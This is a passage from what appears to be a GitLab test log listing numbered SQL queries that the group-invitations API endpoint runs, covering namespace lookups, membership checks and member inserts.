\"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" INNER JOIN \"members\" ON \"namespaces\".\"id\" = \"members\".\"source_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"namespaces\".\"type\" = 'Group' AND \"members\".\"user_id\" = 739 AND \"members\".\"requested_at\" IS NULL AND (access_level \u003e= 10))\n       UNION\n       (SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\", \"base_and_ancestors\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = \"base_and_ancestors\".\"parent_id\")), \"base_and_descendants\" AS ((SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" INNER JOIN \"members\" ON \"namespaces\".\"id\" = \"members\".\"source_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"namespaces\".\"type\" = 'Group' AND \"members\".\"user_id\" = 739 AND \"members\".\"requested_at\" IS NULL AND (access_level \u003e= 10))\n       UNION\n       (SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\", \"base_and_descendants\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"parent_id\" = \"base_and_descendants\".\"id\")) SELECT \"namespaces\".\"two_factor_grace_period\" FROM ((SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"base_and_ancestors\" AS \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group')\n       UNION\n       (SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"base_and_descendants\" AS \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group')) namespaces WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"require_two_factor_authentication\" = TRUE /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       53: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"owner_id\" = 739 AND \"namespaces\".\"type\" = 'User' LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       54: INSERT INTO \"user_details\" (\"user_id\") VALUES (739) RETURNING \"user_id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       55: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       56: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 741 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       57: SELECT 1 AS one FROM ((SELECT \"members\".\"id\", \"members\".\"access_level\", \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\" LEFT OUTER JOIN \"users\" ON \"users\".\"id\" = \"members\".\"user_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"users\".\"state\" = 'active' AND \"members\".\"state\" = 0 AND \"members\".\"requested_at\" IS NULL AND \"members\".\"invite_token\" IS NULL AND (members.access_level \u003e 5) AND (members.access_level \u003e 5) AND \"members\".\"source_id\" = 1011)\n       UNION\n       (WITH \"group_group_links_cte\" AS MATERIALIZED (SELECT \"group_group_links\".* FROM \"group_group_links\" WHERE \"group_group_links\".\"shared_group_id\" = 1011) SELECT \"members\".\"id\", LEAST(\"group_group_links\".\"group_access\", \"members\".\"access_level\") AS access_level, \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\", \"group_group_links_cte\" AS \"group_group_links\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"requested_at\" IS NULL AND \"members\".\"source_id\" = \"group_group_links\".\"shared_with_group_id\" AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"state\" = 0 AND (members.access_level \u003e 5))) members LEFT OUTER JOIN \"users\" ON \"users\".\"id\" = \"members\".\"user_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND ((\"members\".\"user_id\" IS NULL AND \"members\".\"invite_token\" IS NOT NULL) OR \"users\".\"state\" = 'active') AND \"members\".\"requested_at\" IS NULL AND (members.access_level \u003e 5) AND \"members\".\"access_level\" = 50 AND \"members\".\"user_id\" = 741 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       58: SELECT 1 AS one FROM ((SELECT \"members\".\"id\", \"members\".\"access_level\", \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\" LEFT OUTER JOIN \"users\" ON \"users\".\"id\" = \"members\".\"user_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"users\".\"state\" = 'active' AND \"members\".\"state\" = 0 AND \"members\".\"requested_at\" IS NULL AND \"members\".\"invite_token\" IS NULL AND (members.access_level \u003e 5) AND (members.access_level \u003e 5) AND \"members\".\"source_id\" = 1011)\n       UNION\n       (WITH \"group_group_links_cte\" AS MATERIALIZED (SELECT \"group_group_links\".* FROM \"group_group_links\" WHERE \"group_group_links\".\"shared_group_id\" = 1011) SELECT \"members\".\"id\", LEAST(\"group_group_links\".\"group_access\", \"members\".\"access_level\") AS access_level, \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\", \"group_group_links_cte\" AS \"group_group_links\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"requested_at\" IS NULL AND \"members\".\"source_id\" = \"group_group_links\".\"shared_with_group_id\" AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"state\" = 0 AND (members.access_level \u003e 5))) members LEFT OUTER JOIN \"users\" ON \"users\".\"id\" = \"members\".\"user_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND ((\"members\".\"user_id\" IS NULL AND \"members\".\"invite_token\" IS NOT NULL) OR \"users\".\"state\" = 'active') AND \"members\".\"requested_at\" IS NULL AND (members.access_level \u003e 5) AND \"members\".\"access_level\" = 50 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       59: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"user_id\" = 741 AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"source_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       60: SELECT \"saml_providers\".* FROM \"saml_providers\" WHERE \"saml_providers\".\"group_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       61: SELECT 1 AS one FROM ((SELECT \"members\".* FROM \"members\" WHERE \"members\".\"source_type\" = 'Namespace' AND \"members\".\"source_id\" IN (SELECT \"namespaces\".\"id\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND (traversal_ids @\u003e ('{1011}'))))\n       UNION\n       (SELECT \"members\".* FROM \"members\" WHERE \"members\".\"source_type\" = 'Project' AND \"members\".\"source_id\" IN (SELECT \"projects\".\"id\" FROM \"projects\" WHERE \"projects\".\"namespace_id\" IN (SELECT namespaces.traversal_ids[array_length(namespaces.traversal_ids, 1)] AS id FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND (traversal_ids @\u003e ('{1011}')))))) members WHERE \"members\".\"user_id\" = 741 AND (\"members\".\"state\" IN (0)) LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       62: SELECT \"namespace_settings\".* FROM \"namespace_settings\" WHERE \"namespace_settings\".\"namespace_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       63: INSERT INTO \"members\" (\"access_level\", \"source_id\", \"source_type\", \"user_id\", \"type\", \"created_at\", \"updated_at\", \"created_by_id\", \"member_namespace_id\", \"notification_level\") VALUES (30, 1011, 'Namespace', 741, 'GroupMember', '2022-03-01 16:06:46.718864', '2022-03-01 16:06:46.718864', 736, 1011, 3) RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       64: SELECT \"notification_settings\".* FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 741 AND \"notification_settings\".\"source_type\" = 'Namespace' AND \"notification_settings\".\"source_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       65: SELECT 1 AS one FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 741 AND \"notification_settings\".\"source_type\" = 'Namespace' AND \"notification_settings\".\"source_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       66: INSERT INTO \"notification_settings\" (\"user_id\", \"source_id\", \"source_type\", \"created_at\", \"updated_at\", \"level\") VALUES (741, 1011, 'Namespace', '2022-03-01 16:06:46.746474', '2022-03-01 16:06:46.746474', 3) RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       67: SELECT \"user_details\".* FROM \"user_details\" WHERE \"user_details\".\"user_id\" = 741 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       68: SELECT \"gitlab_subscriptions\".* FROM \"gitlab_subscriptions\" WHERE \"gitlab_subscriptions\".\"namespace_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       69: SELECT 1 AS one FROM \"web_hooks\" WHERE \"web_hooks\".\"type\" = 'GroupHook' AND \"web_hooks\".\"group_id\" IN (SELECT \"namespaces\".\"id\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 1011) LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       70: SELECT 1 AS one FROM \"namespaces\" INNER JOIN \"members\" ON \"namespaces\".\"id\" = \"members\".\"source_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"namespaces\".\"type\" = 'Group' AND \"members\".\"user_id\" = 741 AND \"members\".\"requested_at\" IS NULL AND (access_level \u003e= 10) LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       71: WITH RECURSIVE \"base_and_ancestors\" AS ((SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" INNER JOIN \"members\" ON 